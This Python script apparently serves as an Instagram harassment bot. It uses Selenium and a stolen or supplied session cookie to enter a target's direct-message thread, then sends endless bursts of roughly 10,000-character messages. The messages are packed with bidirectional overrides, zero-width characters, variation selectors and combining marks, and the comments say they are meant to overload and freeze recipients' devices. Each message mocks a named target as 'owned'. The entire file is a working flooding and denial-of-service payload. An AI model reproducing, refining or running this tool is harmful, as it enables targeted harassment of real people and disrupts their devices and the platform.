# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (V100-SUPERNOVA)
# 📅 STATUS: GPU-GLITCH | INFINITE JITTER | MAX AGGRESSION

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- AGGRESSION CONFIG ---
THREADS = 2
SESSION_LIMIT = 240 # Longer sessions
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_supernova_payload(target_name):
    """The Supernova: GPU-Cache Poisoning & Layout Fragmentation."""
    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR: {target_name.upper()} HAS BEEN OWNED\n"
    
    # 💥 THE 'GPU-TRAP' (Variation Selector Stacking)
    # Forces the device to check for non-existent styles 500x per message.
    gpu_trap = "\ufe0f\ufe0e" * 500 
    
    # 💥 THE 'RECURSION VOID' (Max depth for 2026 engines)
    void = "\u2066\u2067\u2068" * 90 
    
    # 💥 THE 'CLOG' (8,000 char buffer smashing)
    clog = "\u200D\u200C\uFEFF\u00A0" * 2000 
    
    # 💥 THE 'DIRECTIONAL OVERLOAD'
    thrash = "\u202E\u202D\u200F\u200E" * 60
    
    # 💥 THE 'VERTICAL STRETCH' (The Infinity Skyscraper)
    z_stack = "̸" * 50 + "̰" * 50 + "̵" * 50
    
    lines = [header, gpu_trap, void]
    for i in range(55):
        style = thrash if i % 2 == 0 else thrash[::-1]
        # Adding Non-Breaking Spaces (\u00A0) to force atomic rendering
        lines.append(f"\u00A0 {style} {target_name.upper()}_VOID {z_stack}")
    
    lines.append(clog)
    return "\n".join(lines)[:9950] # Pushing the 10k limit

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"supernova_{MACHINE_ID}_{agent_id}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ SUPERNOVA INITIALIZED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(6)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(10)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 SUPER-BURST: 5 Ultra-Heavy Messages in a row
                    for _ in range(5):
                        payload = get_supernova_payload(target_name)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        box.send_keys(Keys.ENTER)
                        time.sleep(0.2) # High-speed burst
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 SUPERNOVA IMPACT | {target_name.upper()} DESTROYED", flush=True)
                    
                    # 💥 AGGRESSIVE COOLDOWN: Dropped from 20s to 8s
                    time.sleep(random.uniform(7, 9)) 
                    
                except:
                    time.sleep(3)
                    break 
        except Exception as e:
            print(f"⚠️ Error: {str(e)[:40]}", flush=True)
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
